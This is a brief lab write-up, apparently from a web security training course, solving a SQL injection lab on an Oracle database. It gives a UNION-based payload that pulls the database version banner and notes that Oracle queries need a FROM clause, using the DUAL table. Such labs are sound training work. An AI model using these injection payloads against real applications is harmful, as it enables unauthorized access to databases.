
## Description:

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the result from an injected query

## Solution:

' UNION SELECT BANNER,NULL FROM V$VERSION--

### Notes:

on oracle databases, every **SELECT** statement must specify a table to select **FROM**, if the **UNION SELECT** attack does not query from a table it is still needed to include the **FROM** keyword followed by a valid table name

there is a built-in name for this purpose called **DUAL**

SELECT NULL,NULL FROM DUAL--
